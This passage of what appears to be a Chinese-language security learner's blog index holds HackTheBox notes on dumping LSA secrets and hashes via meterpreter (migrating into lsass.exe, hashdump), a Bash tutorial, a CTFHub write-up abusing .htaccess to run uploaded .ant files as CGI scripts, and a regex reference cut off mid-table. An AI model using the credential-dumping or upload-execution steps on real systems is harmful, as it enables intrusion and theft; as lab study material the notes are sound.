NT AUTHORITY\NetworkServiceSecret  : _SC_LmHosts / service &#39;LmHosts&#39; with username : NT AUTHORITY\LocalServiceSecret  : _SC_MSDTC / service &#39;MSDTC&#39; with username : NT AUTHORITY\NetworkServiceSecret  : _SC_RpcLocator / service &#39;RpcLocator&#39; with username : NT AUTHORITY\NetworkServiceSecret  : _SC_RpcSs / service &#39;RpcSs&#39; with username : NT AUTHORITY\NetworkServiceSecret  : _SC_stisvc / service &#39;stisvc&#39; with username : NT AUTHORITY\LocalServiceSecret  : _SC_TlntSvr / service &#39;TlntSvr&#39; with username : NT AUTHORITY\LocalServiceSecret  : _SC_WebClient / service &#39;WebClient&#39; with username : NT AUTHORITY\LocalService</code></pre><p>我们看一下什么是lsa（GPT）：</p><pre><code>在Windows操作系统中，LSA（Local Security Authority）是一个关键的系统组件，它负责管理本地安全策略、用户身份验证和安全凭证的存储。LSA维护着安全策略数据库，其中包含了用户账户信息、密码哈希值以及其他安全相关的信息。LSA提供了一些API（应用程序接口）供其他系统组件和应用程序使用，其中之一是LSA Secrets API。这个API允许授权的程序读取和写入LSA Secrets，这些Secrets包含敏感信息，例如密码、证书、密钥等。&quot;lsa_dump_secrets&quot;是一个工具或命令，它可能是用于提取和显示LSA Secrets的工具。这个工具可以被用于安全评估、密码破解或恢复等场景，通过读取LSA Secrets可以获得密码哈希值或其他敏感信息，从而进行进一步的攻击或渗透测试。需要注意的是，使用这样的工具需要合法的权限和授权，未经授权使用可能会违反法律或违反系统安全政策。</code></pre><p>除了使用工具，我们可以这样获得lsa_dump:</p><p>(这里有个疑问，YouTube博主实在shell中执行命令，而我只能在meterpreter 上执行，很奇怪…)</p><p>使用ps找到lsass.exe：</p><pre><code> 636    472   lsass.exe    x64   0        NT AUTHORITY\SYSTE  C:\Windows\System32                                          M                   \lsass.exe</code></pre><p>然后使用migrate移动到636</p><pre><code>migrate 636</code></pre><p>然后hashdump即可</p><h5 id="aad3b435b51404eeaad3b435b51404ee"><a href="#aad3b435b51404eeaad3b435b51404ee" class="headerlink" title="aad3b435b51404eeaad3b435b51404ee"></a>aad3b435b51404eeaad3b435b51404ee</h5><p>这是一串空值的LM-hash</p>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
            <tag> practice </tag>
            
            <tag> hackthebox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bash</title>
      <link href="/2023/06/12/bash/"/>
      <url>/2023/06/12/bash/</url>
      
        <content type="html"><![CDATA[<h2 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h2><h3 id="参数变量"><a href="#参数变量" class="headerlink" title="参数变量:"></a>参数变量:</h3><table><thead><tr><th><code>$#</code></th><th>此变量保存传递给脚本的参数数。</th></tr></thead><tbody><tr><td><code>$@</code></td><td>此变量可用于检索命令行参数列表。</td></tr><tr><td><code>$n</code></td><td>可以使用其位置有选择地检索每个命令行参数。例如，第一个参数位于 。<code>$1</code></td></tr><tr><td><code>$$</code></td><td>当前正在执行的进程的进程 ID。</td></tr><tr><td><code>$?</code></td><td>脚本的退出状态。此变量可用于确定命令是否成功。值 0 表示成功执行，而值 1 表示失败的结果。</td></tr></tbody></table><table><thead><tr><th><code>$#</code></th><th>在这种情况下，我们只需要一个需要分配给该变量的变量。此变量用于指定我们要使用的目标。如果我们只提供一个 FQDN 作为参数，则该变量的值为 .<code>domain``$#``1</code></th></tr></thead><tbody><tr><td><code>$0</code></td><td>此特殊变量被分配执行脚本的名称，然后在 “” 示例中显示。<code>Usage:</code></td></tr><tr><td><code>$1</code></td><td>用空格分隔，第一个参数分配给该特殊变量。</td></tr></tbody></table><span id="more"></span><h3 id="引号的区别"><a href="#引号的区别" class="headerlink" title="引号的区别:"></a>引号的区别:</h3><p>在Bash中，<code>&quot;&quot;</code>（双引号）和 <code>&#39;&#39;</code>（单引号）是用于引用字符串的两种不同方式，它们有以下区别：</p><ol><li>处理变量和命令替换：<ul><li><code>&quot;&quot;</code>：双引号允许变量展开（即替换为变量的值）和命令替换（即替换为命令的输出结果）。例如，<code>&quot;$var&quot;</code>将展开为变量<code>var</code>的值。</li><li><code>&#39;&#39;</code>：单引号将字符串视为字面值，不进行变量展开或命令替换。例如，<code>&#39;$var&#39;</code>将被视为字面字符串<code>$var</code>，而不是变量展开。</li></ul></li><li>处理特殊字符的转义：<ul><li><code>&quot;&quot;</code>：双引号可以使用反斜杠<code>\</code>来转义某些特殊字符，如<code>\&quot;</code>（双引号）、<code>\\</code>（反斜杠）等。这样，特殊字符将被视为普通字符，而不具有其特殊含义。</li><li><code>&#39;&#39;</code>：单引号内的字符串将被视为纯文本，不进行特殊字符的转义。即使特殊字符（如反斜杠和双引号）也将被视为字面值。</li></ul></li></ol><pre><code>var=&quot;world&quot;echo &quot;Hello $var&quot;     # 输出：Hello worldecho &#39;Hello var&#39;     # 输出：Hello varecho &quot;I have $10&quot;    # 输出：I have $10echo &#39;I have 10&#39;     # 输出：I have 10echo &quot;Path: $HOME&quot;    # 输出：Path: /home/usernameecho &#39;Path: HOME&#39;    # 输出：Path: HOMEecho &quot;Quotes: \&quot;\&#39;&quot;   # 输出：Quotes: &quot;&#39;&quot;echo &#39;Quotes: &quot;\&#39;\&#39;&#39;&quot; # 输出：Quotes: &quot;\&#39;&quot;</code></pre><p>&#x3D;&#x3D;分配变量时，名称和值之间不得有空格。&#x3D;&#x3D;</p><p>需要注意的是，单引号 （…） 和双引号 （ … ） 可防止数组中各个值之间的空格分隔。这意味着&#x3D;&#x3D;单引号和双引号之间的所有空格都将被忽略&#x3D;&#x3D;，并作为分配给数组的单个值进行处理。</p><h3 id="数组："><a href="#数组：" class="headerlink" title="数组："></a>数组：</h3><p>示例代码 <code>domains=(www.inlanefreight.com ftp.inlanefreight.com vpn.inlanefreight.com www2.inlanefreight.com)</code> 是一种有效的方式来创建名为 <code>domains</code> 的数组，并将指定的字符串元素分配给数组的各个索引位置。</p><p>在这个例子中，<code>domains</code> 数组包含了四个元素，分别是 <code>&quot;www.inlanefreight.com&quot;</code>, <code>&quot;ftp.inlanefreight.com&quot;</code>, <code>&quot;vpn.inlanefreight.com&quot;</code>, 和 <code>&quot;www2.inlanefreight.com&quot;</code>。</p><p>你可以通过使用索引来访问和操作数组的元素。例如：</p><pre><code>echo $&#123;domains[0]&#125;  # 输出：www.inlanefreight.comecho $&#123;domains[2]&#125;  # 输出：vpn.inlanefreight.comdomains[1]=&quot;newdomain.com&quot;  # 修改索引为1的元素echo $&#123;domains[@]&#125;  # 输出整个数组内容</code></pre><h3 id="字符串运算符："><a href="#字符串运算符：" class="headerlink" title="字符串运算符："></a>字符串运算符：</h3><table><thead><tr><th><code>==</code></th><th>等于</th></tr></thead><tbody><tr><td><code>!=</code></td><td>不等于</td></tr><tr><td><code>&lt;</code></td><td>小于 ASCII 字母顺序</td></tr><tr><td><code>&gt;</code></td><td>大于 ASCII 字母顺序</td></tr><tr><td><code>-z</code></td><td>如果字符串为空 （null）</td></tr><tr><td><code>-n</code></td><td>如果字符串不为空</td></tr></tbody></table><p>这里需要注意的是，我们将给定参数的变量放在双引号中。这告诉 Bash 变量的内容应该作为字符串处理。否则，我们会得到一个错误。</p><p>字符串比较运算符 “&#x2F;” 只在双方括号内工作。我们可以在互联网上或通过在终端中使用以下命令找到 ASCII 表。我们稍后看一个例子。<code>&lt;``&gt;``[[ &lt;condition&gt; ]]</code></p><h4 id="关于括号"><a href="#关于括号" class="headerlink" title="关于括号"></a>关于括号</h4><p>在 Bash 中，<code>(( ))</code> 是一种用于进行算术运算和数值比较的特殊结构。</p><p>双括号 <code>(( ))</code> 的主要作用是将其内部的内容解释为算术表达式。它可以执行数值的增减操作、比较运算等。</p><p>对于 <code>((stat--))</code>，它是一个自减运算的表达式。它将变量 <code>stat</code> 的值减 1，并将结果赋值给 <code>stat</code> 变量本身。</p><p>请注意，双括号 <code>(( ))</code> 中的表达式不需要使用 <code>$</code> 符号来引用变量。</p><p>以下是一个示例：</p><pre><code>stat=5((stat--))echo $stat  # 输出: 4</code></pre><p>上述示例中，<code>stat</code> 的初始值为 5。<code>((stat--))</code> 表达式将 <code>stat</code> 的值减 1，结果为 4。然后，使用 <code>echo</code> 打印变量 <code>stat</code> 的值，输出为 4。</p><p>双括号 <code>(( ))</code> 还支持其他算术运算，例如加法、乘法、除法等，以及数值比较操作。它提供了更强大的算术操作能力，相比于单括号 <code>[]</code> 或 <code>test</code> 命令更方便和灵活。</p><p>在 Bash 中，单括号 <code>[]</code> 是用于条件测试的一种结构。它可以用于判断表达式的真假，并根据结果进行条件判断。</p><p>以下是单括号 <code>[]</code> 的几种常见用法：</p><ol><li><p>条件判断：<code>[ expression ]</code> 或者 <code>test expression</code></p><p>单括号中的 <code>expression</code> 是一个条件表达式，可以包含变量、比较运算符、逻辑运算符等。条件表达式的结果为真时，返回状态码 0；为假时，返回非零状态码。</p></li></ol><pre><code>if [ $var -eq 10 ]; then    echo &quot;Variable is equal to 10&quot;fi</code></pre><ol start="2"><li>字符串比较：<code>[ string1 operator string2 ]</code></li></ol><p>单括号中的字符串比较用于判断两个字符串之间的关系，常见的操作符包括 <code>-eq</code>（相等）、<code>!=</code>（不相等）、<code>-z</code>（为空字符串）、<code>-n</code>（非空字符串）等。</p><p>示例：</p><pre><code>if [ &quot;$str1&quot; = &quot;$str2&quot; ]; then    echo &quot;Strings are equal&quot;fi</code></pre><ol start="3"><li>文件测试：<code>[ -&lt;option&gt; file ]</code></li></ol><p>单括号中的文件测试用于检查文件的属性或状态，常见的选项包括 <code>-f</code>（判断是否为常规文件）、<code>-d</code>（判断是否为目录）、<code>-r</code>（判断是否可读）等。</p><p>示例：</p><pre><code>if [ -f &quot;$filename&quot; ]; then    echo &quot;File exists and is a regular file&quot;fi</code></pre><p>需要注意的是，单括号 <code>[]</code> 是一种命令结构，它将条件表达式作为命令的参数。在条件判断中，变量应该使用双引号引起来，以防止由于变量为空或包含空格等特殊字符而引发错误。</p><p>另外，与双括号 <code>(( ))</code> 不同，单括号 <code>[]</code> 不支持算术运算，它主要用于条件判断和文件测试。</p><h5 id="htb-可以统计字符串字数"><a href="#htb-可以统计字符串字数" class="headerlink" title="${ #htb}可以统计字符串字数"></a>${ #htb}可以统计字符串字数</h5><h3 id="文件运算符："><a href="#文件运算符：" class="headerlink" title="文件运算符："></a>文件运算符：</h3><table><thead><tr><th><code>-e</code></th><th>如果文件存在</th></tr></thead><tbody><tr><td><code>-f</code></td><td>测试它是否为文件</td></tr><tr><td><code>-d</code></td><td>测试它是否是目录</td></tr><tr><td><code>-L</code></td><td>测试是否为符号链接</td></tr><tr><td><code>-N</code></td><td>检查文件在上次读取后是否被修改</td></tr><tr><td><code>-O</code></td><td>如果当前用户拥有该文件</td></tr><tr><td><code>-G</code></td><td>如果文件的组 ID 与当前用户的组 ID 匹配</td></tr><tr><td><code>-s</code></td><td>测试文件大小是否大于 0</td></tr><tr><td><code>-r</code></td><td>测试文件是否具有读取权限</td></tr><tr><td><code>-w</code></td><td>测试文件是否具有写入权限</td></tr><tr><td><code>-x</code></td><td>测试文件是否具有执行权限</td></tr></tbody></table><p>示例：查看文件是否存在</p><pre><code>#!/bin/bash# Check if the specified file existsif [ -e &quot;$1&quot; ]then    echo -e &quot;The file exists.&quot;    exit 0else    echo -e &quot;The file does not exist.&quot;    exit 2fi</code></pre><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><table><thead><tr><th><code>!</code></th><th>逻辑否定不是</th></tr></thead><tbody><tr><td><code>&amp;&amp;</code></td><td>逻辑和</td></tr><tr><td>&#96;</td><td></td></tr></tbody></table><h4 id="关于"><a href="#关于" class="headerlink" title="关于=~"></a>关于<code>=~</code></h4><pre><code>在 Bash 中，`=~` 是一个用于正则表达式匹配的操作符。它用于将一个字符串与一个正则表达式进行匹配。</code></pre><p>语法为：</p><pre><code>[[ string =~ regex ]]</code></pre><p>其中 <code>string</code> 是要匹配的字符串，<code>regex</code> 是正则表达式模式。</p><p>当使用 <code>=~</code> 进行匹配时，如果 <code>string</code> 符合 <code>regex</code> 的模式，条件将为真；否则，条件将为假。</p><p>这个操作符通常用于条件语句，例如 <code>if</code> 语句中，用于检查字符串是否符合特定的正则表达式模式。</p><p>以下是一个示例：</p><pre><code>string=&quot;Hello, world!&quot;if [[ $string =~ o,.*ld! ]]; then    echo &quot;Matched!&quot;else    echo &quot;Not matched!&quot;fi</code></pre><p>上述示例中，如果 <code>string</code> 匹配了模式 <code>o,.*ld!</code>，则条件为真，将输出 “Matched!”。否则，将输出 “Not matched!”。</p><h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><pre><code>在 Bash 中，文件描述符是用于标识不同类型的输入/输出流的整数。常见的文件描述符有以下几种：</code></pre><ul><li>0: 标准输入（stdin）</li><li>1: 标准输出（stdout）</li><li>2: 标准错误（stderr）</li></ul><p>使用 <code>&gt;</code> 或 <code>&lt;</code> 进行重定向时，默认情况下会操作标准输出。但是，当使用 <code>&amp;</code> 将数字与 <code>&gt;</code> 或 <code>&lt;</code> 结合使用时，它会告诉 Bash 这是一个文件描述符，而不是普通的输入&#x2F;输出操作符。</p><p>因此，<code>2&gt;&amp;1</code> 将标准错误的文件描述符 <code>2</code> 与 <code>&gt;</code> 结合，指示 Bash 将标准错误重定向到其前面的文件描述符 <code>1</code>，即标准输出。</p><p>这种语法允许将标准错误输出合并到标准输出中，以便统一处理和重定向这两个流的内容。</p><p>在 Bash 中，<code>2&gt;&amp;1</code> 是一种重定向语法，用于将标准错误（标识符为2）重定向到标准输出。</p><p>具体来说，<code>2</code> 表示标准错误的文件描述符，<code>1</code> 表示标准输出的文件描述符。<code>&gt;</code> 符号用于将输出重定向到指定的文件描述符。</p><p>因此，<code>2&gt;&amp;1</code> 将标准错误重定向到标准输出，意味着标准错误的输出将与标准输出一起显示。</p><p>以下是一些示例说明：</p><ul><li><code>command 2&gt;&amp;1</code>：将 <code>command</code> 命令的标准错误输出合并到标准输出中。</li><li><code>command &gt; output.txt 2&gt;&amp;1</code>：将 <code>command</code> 命令的标准输出和标准错误输出都重定向到 <code>output.txt</code> 文件中。</li></ul><p>这种重定向语法常用于捕获和处理命令的错误消息，以及将标准输出和标准错误输出一起保存到日志文件中。</p><p>需要注意的是，<code>2&gt;&amp;1</code> 中的空格很重要，确保它们位于 <code>2</code>、<code>&gt;</code> 和 <code>1</code> 之间，以及 <code>&amp;</code> 符号前后，以正确指定重定向操作。</p><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><table><thead><tr><th><code>1</code></th><th>一般错误</th></tr></thead><tbody><tr><td><code>2</code></td><td>滥用外壳内置</td></tr><tr><td><code>126</code></td><td>调用的命令无法执行</td></tr><tr><td><code>127</code></td><td>找不到命令</td></tr><tr><td><code>128</code></td><td>退出的参数无效</td></tr><tr><td><code>128+n</code></td><td>致命错误信号”<code>n</code>“</td></tr><tr><td><code>130</code></td><td>脚本由 Control-C 终止</td></tr><tr><td><code>255\*</code></td><td>退出状态超出范围</td></tr></tbody></table><h4 id="2-gt-amp-1"><a href="#2-gt-amp-1" class="headerlink" title="2&gt;&amp;1"></a>2&gt;&amp;1</h4><p>在 Bash 中，<code>2&gt;&amp;1</code> 是一种重定向语法，用于将标准错误（标识符为2）重定向到标准输出。</p><p>具体来说，<code>2</code> 表示标准错误的文件描述符，<code>1</code> 表示标准输出的文件描述符。<code>&gt;</code> 符号用于将输出重定向到指定的文件描述符。</p><p>因此，<code>2&gt;&amp;1</code> 将标准错误重定向到标准输出，意味着标准错误的输出将与标准输出一起显示。</p><p>以下是一些示例说明：</p><ul><li><code>command 2&gt;&amp;1</code>：将 <code>command</code> 命令的标准错误输出合并到标准输出中。</li><li><code>command &gt; output.txt 2&gt;&amp;1</code>：将 <code>command</code> 命令的标准输出和标准错误输出都重定向到 <code>output.txt</code> 文件中。</li></ul><p>这种重定向语法常用于捕获和处理命令的错误消息，以及将标准输出和标准错误输出一起保存到日志文件中。</p><p>需要注意的是，<code>2&gt;&amp;1</code> 中的空格很重要，确保它们位于 <code>2</code>、<code>&gt;</code> 和 <code>1</code> 之间，以及 <code>&amp;</code> 符号前后，以正确指定重定向操作。</p><p>&amp;在这里的含义是什么</p><p>ChatGPT</p><p>在 <code>2&gt;&amp;1</code> 中，<code>&amp;</code> 的含义是将其前面的数字 <code>2</code> 解释为文件描述符而不是普通的字符。</p><p>在 Bash 中，文件描述符是用于标识不同类型的输入&#x2F;输出流的整数。常见的文件描述符有以下几种：</p><ul><li>0: 标准输入（stdin）</li><li>1: 标准输出（stdout）</li><li>2: 标准错误（stderr）</li></ul><p>使用 <code>&gt;</code> 或 <code>&lt;</code> 进行重定向时，默认情况下会操作标准输出。但是，当使用 <code>&amp;</code> 将数字与 <code>&gt;</code> 或 <code>&lt;</code> 结合使用时，它会告诉 Bash 这是一个文件描述符，而不是普通的输入&#x2F;输出操作符。</p><p>因此，<code>2&gt;&amp;1</code> 将标准错误的文件描述符 <code>2</code> 与 <code>&gt;</code> 结合，指示 Bash 将标准错误重定向到其前面的文件描述符 <code>1</code>，即标准输出。</p><p>这种语法允许将标准错误输出合并到标准输出中，以便统一处理和重定向这两个流的内容。</p><p>这在我们反弹shell的时候会用到。</p>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Mod CGI</title>
      <link href="/2023/06/11/Apache%20Mod%20CGI/"/>
      <url>/2023/06/11/Apache%20Mod%20CGI/</url>
      
        <content type="html"><![CDATA[<h1 id="Apache-Mod-CGI"><a href="#Apache-Mod-CGI" class="headerlink" title="Apache Mod CGI"></a>Apache Mod CGI</h1><h4 id="知识储备："><a href="#知识储备：" class="headerlink" title="知识储备："></a>知识储备：</h4><p>参考文章：<a href="https://blog.csdn.net/qq_62078839/article/details/125691017?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167152297616800182178110%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167152297616800182178110&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-125691017-null-null.142%5Ev68%5Epc_new_rank,201%5Ev4%5Eadd_ask,213%5Ev2%5Et3_esquery_v2&utm_term=%20Apache%20Mod%20CGI&spm=1018.2226.3001.4187">CTFHUB-Apache Mod CGI(PHP学习)</a></p><p><strong>原理简述</strong></p><blockquote><p>早期的Web服务器，只能响应浏览器发来的HTTP静态资源的请求，并将存储在服务器中的静态资源返回给浏览器。随着Web技术的发展，逐渐出现了动态技术，但是Web服务器并不能够直接运行动态脚本，为了解决Web服务器与外部应用程序（CGI程序）之间数据互通，于是出现了CGI（Common Gateway Interface）通用网关接口。简单理解，可以认为CGI是Web服务器和运行其上的应用程序进行“交流”的一种约定。</p><p>当遇到动态脚本请求时，Web服务器主进程就会<code>Fork</code>创建出一个新的进程来启动CGI程序，运行外部C程序或Perl、PHP脚本等，也就是将动态脚本交给CGI程序来处理。这样，每次用户请求动态脚本，Web服务器都要重新Fork创建一个新进程去启动CGI程序，由CGI程序来处理动态脚本，处理完成后进程随之关闭，其效率是非常低下的。</p><p>而对于Mod CGI，Web服务器可以内置Perl解释器或PHP解释器。也就是说将这些解释器做成模块的方式，Web服务器会在启动的时候就启动这些解释器。当有新的动态请求进来时，Web服务器就是&#x3D;&#x3D;自己解析这些动态脚本&#x3D;&#x3D;，省得重新Fork一个进程，效率提高了。<br>​</p></blockquote><span id="more"></span><p><strong>使用条件：</strong></p><blockquote><ul><li>Linux 操作系统 Apache + PHP (apache 使用 apache_mod_php) Apache 开启了<code>cgi</code>、<code>rewrite</code></li><li>Web 目录给了<code>AllowOverride</code>权限</li><li>当前目录可写</li></ul></blockquote><p><strong>AllowOverride</strong></p><blockquote><p>在 AllowOverride 设置为 None 时， .htaccess 文件将被完全忽略。当此指令设置为 All 时，所有具有 “.htaccess” <a href="https://so.csdn.net/so/search?q=%E4%BD%9C%E7%94%A8%E5%9F%9F&spm=1001.2101.3001.7020">作用域</a>的指令都允许出现在 .htaccess 文件中。</p></blockquote><h2 id="实战：ctfhub"><a href="#实战：ctfhub" class="headerlink" title="实战：ctfhub"></a>实战：ctfhub</h2><p>先上传一个.htaccess文件让系统把我们上传的<code>ant</code>文件当作CGI文件：</p><pre><code>Options +ExecCGIAddHandler cgi-script .ant</code></pre><p>然后上传一个<code>.ant</code>文件：</p><pre><code>#!/bin/shecho&amp;&amp;tac /flag;</code></pre><p>这里有个疑问：必须使用 &amp;&amp; 连接符后才能正确返回，否则网页报错。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则运算</title>
      <link href="/2023/06/11/Regular_operations/"/>
      <url>/2023/06/11/Regular_operations/</url>
      
        <content type="html"><![CDATA[<h1 id="正则运算"><a href="#正则运算" class="headerlink" title="正则运算"></a>正则运算</h1><h2 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h2><p>修饰符用于执行区分大小写和全局匹配:</p><table><thead><tr><th>修饰符</th><th>描述</th></tr></thead><tbody><tr><td><a href="https://www.runoob.com/js/jsref-regexp-i.html">i</a></td><td>执行对大小写不敏感的匹配。</td></tr><tr><td><a href="https://www.runoob.com/js/jsref-regexp-g.html">g</a></td><td>执行全局匹配（查找所有匹配而非在找到第一个匹配后停止）。</td></tr><tr><td>m</td><td>执行多行匹配。</td></tr></tbody></table><span id="more"></span><h2 id="方括号"><a href="#方括号" class="headerlink" title="方括号"></a>方括号</h2><p>方括号用于查找某个范围内的字符：</p><table><thead><tr><th>表达式</th><th>描述</th></tr></thead><tbody><tr><td>[<a href="https://www.runoob.com/jsref/jsref-regexp-charset.html">abc]</a></td><td>查找方括号之间的任何字符。</td></tr><tr><td>[<a href="https://www.runoob.com/jsref/jsref-regexp-charset-not.html">^abc]</a></td><td>查找任何不在方括号之间的字符。</td></tr><tr><td>[0-9]</td><td>查找任何从 0 至 9 的数字。</td></tr><tr><td>[a-z]</td><td>查找任何从小写 a 到小写 z 的字符。</td></tr><tr><td>[A-Z]</td><td>查找任何从大写 A 到大写 Z 的字符。</td></tr><tr><td>[A-z]</td><td>查找任何从大写 A 到小写 z 的字符。</td></tr><tr><td>[adgk]</td><td>查找给定集合内的任何字符。</td></tr><tr><td>[^adgk]</td><td>查找给定集合外的任何字符。</td></tr><tr><td>(red|blue|green)</td><td>查找任何指定的选项。</td></tr></tbody></table><h2 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h2><p>元字符（Metacharacter）是拥有特殊含义的字符：</p><table><thead><tr><th>元字符</th><th>描述</th></tr></thead><tbody><tr><td><a href="https://www.runoob.com/jsref/jsref-regexp-dot.html">.</a></td><td>查找单个字符，除了换行和行结束符。</td></tr><tr><td><a href="https://www.runoob.com/jsref/jsref-regexp-wordchar.html">\w</a></td><td>查找数字、字母及下划线。</td></tr><tr><td><a href="https://www.runoob.com/jsref/jsref-regexp-wordchar-non.html">\W</a></td><td>查找非单词字符。</td></tr><tr><td><a href="https://www.runoob.com/jsref/jsref-regexp-digit.html">\d</a></td><td>查找数字。</td></tr><tr><td><a href="https://www.runoob.com/jsref/jsref-regexp-digit-non.html">\D</a></td><td>查找非数字字符。</td></tr><tr><td><a href="https://www.runoob.com/jsref/jsref-regexp-whitespace.html">\s</a></td><td>查找空白字符。</td></tr><tr><td><a href="https://www.runoob.com/jsref/jsref-regexp-whitespace-non.html">\S</a></td><td>查找非空白字符。</td></tr><tr><td><a href="https://www.runoob.com/jsref/jsref-regexp-begin.html">\b</a></td><td>匹配单词边界。</td></tr><tr><td><a href="https://www.runoob.com/jsref/jsref-regexp-begin-not.html">\B</a></td><td>匹配非单词边界。</td></tr><tr><td>\0</td><td>查找 NULL 字符。</td></tr><tr><td><a href="https://www.runoob.com/jsref/jsref-regexp-newline.html">\n</a></td><td>查找换行符。</td></tr><tr><td>\f</td><td>查找换页符。</td></tr><tr><td>\r</td><td>查找回车符。</td></tr><tr><td>\t</td><td>查找制表符。</td></tr><tr><td>\v</td><td>查找垂直制表符。</td></tr><tr><td><a href="https://www.runoob.com/jsref/jsref-regexp-octal.html">\xxx</a></td><td>查找以八进制数 xxx 规定的字符。</td></tr><tr><td><a href="https://www.runoob.com/jsref/jsref-regexp-hex.html">\xdd</a></td><td>查找以十六进制数 dd 规定的字符。</td></tr><tr><td><a href="https://www.runoob.com/jsref/jsref-regexp-unicode-hex.html">\uxxxx</a></td><td>查找以十六进制数 xxxx 规定的 Unicode 字符。</td></tr></tbody></table><h2 id="量词"><a href="#量词" class="headerlink" title="量词"></a>量词</h2><table><thead><tr><th>量词</th><th>描述</th></tr></thead><tbody><tr><td><a href="https://www.runoob.com/jsref/jsref-regexp-onemore.html">n+</a></td><td>匹配任何包含至少一个 n 的字符串。例如，&#x2F;a+&#x2F; 匹配 “candy” 中的 “a”，”caaaaaaandy” 中所有的 “a”。</td></tr><tr><td><a href="https://www.runoob.com/jsref/jsref-regexp-zeromore.html">n*</a></td><td>匹配任何包含零个或多个 n 的字符串。例如，&#x2F;bo*&#x2F; 匹配 “A ghost booooed” 中的 “boooo”，”A bird warbled” 中的 “b”，但是不匹配 “A goat grunted”。</td></tr><tr><td><a href="https://www.runoob.com/jsref/jsref-regexp-zeroone.html">n?</a></td><td>匹配任何包含零个或一个 n 的字符串。例如，&#x2F;e?le?&#x2F; 匹配 “angel” 中的 “el”，”angle” 中的 “le”。</td></tr><tr><td><a href="https://www.runoob.com/jsref/jsref-regexp-nx.html">n{X}</a></td><td>匹配包含 X 个 n 的序列的字符串。例如，&#x2F;a{2}&#x2F; 不匹配 “candy,” 中的 “a”，但是匹配 “caandy,” 中的两个 “a”，且匹配 “caaandy.” 中的前两个 “a”。</td></tr><tr><td><a href="https://www.runoob.com/jsref/jsref-regexp-nxcomma.html">n{X,}</a></td><td>X 是一个正整数。前面的模式 n 连续出现至少 X 次时匹配。例如，&#x2F;a{2,}&#x2F; 不匹配 “candy” 中的 “a”，但是匹配 “caandy” 和 “caaaaaaandy.” 中所有的 “a”。</td></tr><tr><td><a href="https://www.runoob.com/jsref/jsref-regexp-nxy.html">n{X,Y}</a></td><td>X 和 Y 为正整数。前面的模式 n 连续出现至少 X 次，至多 Y 次时匹配。例如，&#x2F;a{1,3}&#x2F; 不匹配 “cndy”，匹配 “candy,” 中的 “a”，”caandy,” 中的两个 “a”，匹配 “caaaaaaandy” 中的前面三个 “a”。注意，当匹配 “caaaaaaandy” 时，即使原始字符串拥有更多的 “a”，匹配项也是 “aaa”。</td></tr><tr><td><a href="https://www.runoob.com/jsref/jsref-regexp-ndollar.html">n$</a></td><td>匹配任何结尾为 n 的字符串。</td></tr><tr><td><a href="https://www.runoob.com/jsref/jsref-regexp-ncaret.html">^n</a></td><td>匹配任何开头为 n 的字符串。</td></tr><tr><td><a href="https://www.runoob.com/jsref/jsref-regexp-nfollow.html">?&#x3D;n</a></td><td>匹配任何其后紧接指定字符串 n 的字符串。</td></tr><tr><td><a href="https://www.runoob.com/jsref/jsref-regexp-nfollow-not.html">?!n</a></td><td>匹配任何其后没有紧接指定字符串 n 的字符串。</td></tr></tbody></table><h2 id="RegExp-对象方法"><a href="#RegExp-对象方法" class="headerlink" title="RegExp 对象方法"></a>RegExp 对象方法</h2><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td><a href="https://www.runoob.com/jsref/jsref-regexp-compile.html">compile</a></td><td>在 1.5 版本中已废弃。 编译正则表达式。</td></tr><tr><td><a href="https://www.runoob.com/jsref/jsref-exec-regexp.html">exec</a></td><td>检索字符串中指定的值。返回找到的值，并确定其位置。</td></tr><tr><td><a href="https://www.runoob.com/jsref/jsref-test-regexp.html">test</a></td><td>检索字符串中指定的值。返回 true 或 false。</td></tr><tr><td><a href="https://www.runoob.com/jsref/jsref-regexp-tostring.html">toString</a></td><td>返回正则表达式的字符串。</td></tr></tbody></table><h2 id="支持正则表达式的-String-对象的方法"><a href="#支持正则表达式的-String-对象的方法" class="headerlink" title="支持正则表达式的 String 对象的方法"></a>支持正则表达式的 String 对象的方法</h2><table><thead><tr><th>方法</th><th>描述</th><th>FF</th><th>IE</th></tr></thead><tbody><tr><td><a href="https://www.runoob.com/js/jsref-search.html">search</a></td><td>检索与正则表达式相匹配的值。</td><td>1</td><td>4</td></tr><tr><td><a href="https://www.runoob.com/js/jsref-match.html">match</a></td><td>找到一个或多个正则表达式的匹配。</td><td>1</td><td>4</td></tr><tr><td><a href="https://www.runoob.com/js/jsref-replace.html">replace</a></td><td>替换与正则表达式匹配的子串。</td><td>1</td><td>4</td></tr><tr><td><a href="https://www.runoob.com/js/jsref-split.html">split</a></td><td>把字符串分割为字符串数组。</td><td>1</td><td>4</td></tr></tbody></table><hr><h2 id="RegExp-对象属性"><a href="#RegExp-对象属性" class="headerlink" title="RegExp 对象属性"></a>RegExp 对象属性</h2><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td><a href="https://www.runoob.com/jsref/jsref-regexp-constructor.html">constructor</a></td><td>返回一个函数，该函数是一个创建 RegExp 对象的原型。</td></tr><tr><td><a href="https://www.runoob.com/jsref/jsref-regexp-global.html">global</a></td><td>判断是否设置了 “g” 修饰符</td></tr><tr><td><a href="https://www.runoob.com/jsref/jsref-regexp-ignorecase.html">ignoreCase</a></td><td>判断是否设置了 “i” 修饰符</td></tr><tr><td><a href="https://www.runoob.com/jsref/jsref-lastindex-regexp.html">lastIndex</a></td><td>用于规定下次匹配的起始位置</td></tr><tr><td><a 